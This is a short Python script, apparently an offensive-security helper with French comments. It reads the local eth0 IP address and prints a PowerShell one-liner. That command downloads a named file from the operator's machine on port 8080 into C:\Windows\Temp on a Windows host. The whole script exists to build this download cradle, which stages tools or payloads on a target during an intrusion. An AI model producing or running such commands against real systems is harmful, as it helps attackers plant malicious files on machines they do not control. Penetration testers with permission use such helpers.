#!/usr/bin/python
# psh-dl.py
#
# Je suis un gros fegnant qui veut pas apprendre le one-liner pour dl un truc
# en powershell, donc je me fais un script pour ca ...
# Ah, et je ne suis pas un dev python dans l'âme...
#
import sys
import netifaces as ni

file = sys.argv[1]
#print file
# Script stolen from
# http://stackoverflow.com/questions/24196932/how-can-i-get-the-ip-address-of-eth0-in-python
ni.ifaddresses('eth0')
ip = ni.ifaddresses('eth0')[2][0]['addr']
#print ip

base = "powershell (new-object System.Net.WebClient).DownloadFile('http://%s:8080/%s', 'C:\Windows\Temp\%s')" % (ip, file, file)
print base
